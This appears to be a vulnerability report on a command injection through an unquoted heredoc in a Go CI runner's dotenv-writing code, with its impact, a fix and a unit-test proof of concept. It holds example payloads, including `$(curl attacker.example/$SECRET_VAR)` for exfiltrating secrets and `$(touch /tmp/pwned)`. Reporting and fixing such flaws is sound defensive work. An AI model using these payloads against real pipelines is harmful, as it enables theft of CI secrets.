### Title
Command injection via unquoted heredoc delimiter in `BashWriter.DotEnvVariables` - ([File: shells/bash.go])

### Summary
`BashWriter.DotEnvVariables` (shells/bash.go) writes variable values into a file using an **unquoted** heredoc (`cat << EOF ... EOF`), while `helpers.DotEnvEscape` (helpers/shell_escape.go) only escapes backslash, double-quote, newline, and carriage-return characters. Because the heredoc delimiter is unquoted, bash performs parameter expansion and command substitution on the body before it's written to disk, so a variable value containing `$(...)` or backticks is executed at script-generation/execution time rather than being treated as literal data.

### Finding Description
`DotEnvVariables` builds the write command as: [1](#0-0) 

```
fmt.Fprintf(&sb, "cat << EOF > %s\n", dotEnvFile)
sb.WriteString(helpers.DotEnvEscape(variables))
sb.WriteString("EOF\n")
```

Because the here-doc terminator is `EOF` (unquoted, not `'EOF'`), bash treats the body as subject to normal word expansion: `$VAR`, `` `cmd` ``, and `$(cmd)` are all expanded/executed while the here-doc is being read, *before* the text is redirected into `dotEnvFile`. `DotEnvEscape` only escapes `\`, `"`, `\n`, `\r`: [2](#0-1) 

It does not escape `$` or backticks, so a variable value such as `` `id > /tmp/pwned` `` or `$(curl attacker.example/$SECRET_VAR)` passes through untouched into the heredoc body and is executed by the shell that is generating/running the script, with the full environment (including other job variables/secrets) available to it at that point.

By contrast, the read side, `BashWriter.SourceEnv`, is not independently vulnerable: [3](#0-2) 
`export "$line"` expands `$line` inside double quotes, which suppresses word-splitting/globbing and does not re-trigger command/parameter expansion on the *value* of `$line` — text like `$(...)` inside the already-read line remains literal data to `export`. So the exploitable step is exclusively the *write* path (`DotEnvVariables`), not the *read* path (`SourceEnv`).

Attacker-controlled input reaches `DotEnvVariables`'s `variables` map whenever runner-computed or user-influenced key/value pairs (e.g., CI/CD job variables, or values derived from `artifacts:reports:dotenv` in a `needs:`-linked job) are serialized through this function to persist them to a temp env file for later sourcing. A pipeline author who controls a job variable's value, or a downstream job that consumes a dotenv artifact produced by an upstream job in the same pipeline, can set a value containing `$(...)`/backticks.

### Impact Explanation
Command execution occurs during the write of the env file, in whichever job/stage context calls `DotEnvVariables` with attacker-influenced variable values. Because this happens at script-generation time inside the job's own bash execution, the practical impact is scoped to code execution within that job's own container/shell — but if the vulnerable value originates from a cross-job source (e.g., a `dotenv` artifact from a different upstream job merged into a downstream job's variables), this becomes a boundary-crossing issue: the upstream job (which may not have access to the downstream job's secrets/protected variables) can inject code that runs with the downstream job's environment, enabling exfiltration of secrets the injecting job would not otherwise be able to read.

### Likelihood Explanation
Exploitability only requires the ability to control the *value* of one job/CI variable that ends up passed into `DotEnvVariables`— something well within reach of an ordinary pipeline author (setting a CI/CD variable value, or emitting a crafted `dotenv` artifact from a job). No admin privileges or special executor configuration are required, making this straightforward and repeatable.

### Recommendation
Escape `$`, backtick, and `!` (history expansion, if enabled) in `helpers.DotEnvEscape`, or — more robustly — quote the heredoc delimiter in `BashWriter.DotEnvVariables` (`cat << 'EOF' > ...`) so the body is treated as fully literal text with no expansion, matching how the file is later parsed with `read -r`.

### Proof of Concept
Go unit test idea in `shells/bash_test.go`:
```go
func TestDotEnvVariablesCommandInjection(t *testing.T) {
    w := NewBashWriter(&common.Build{}, "bash")
    w.DotEnvVariables("env_file", map[string]string{
        "FOO": "$(touch /tmp/pwned)",
    })
    script := w.String()
    // Assert the heredoc delimiter is NOT quoted (vulnerable) or that FOO's
    // written value still contains the literal `$(...)` text unexpanded
    // when the generated script is actually executed by bash -c.
    assert.NotContains(t, script, "cat << EOF") // expect quoted 'EOF'
}
```
End-to-end PoC: run the generated `DotEnvVariables` script fragment under `bash -c` and assert that `/tmp/pwned` is created — demonstrating that a variable value is executed rather than written literally to the target env file.

func DotEnvEscape(variables map[string]string) string {
	var sb strings.Builder

	// Sort variables to get deterministic output
	keys := make([]string, 0, len(variables))
	for key := range variables {
		keys = append(keys, key)
	}
	sort.Strings(keys)

	for _, key := range keys {
		if !isValidDotEnvKey(key) {
			// Skip invalid keys
			continue
		}

		value := variables[key]
		fmt.Fprintf(&sb, "%s=\"%s\"\n", key, escapeDotEnvValue(value))
	}

	return sb.String()
}
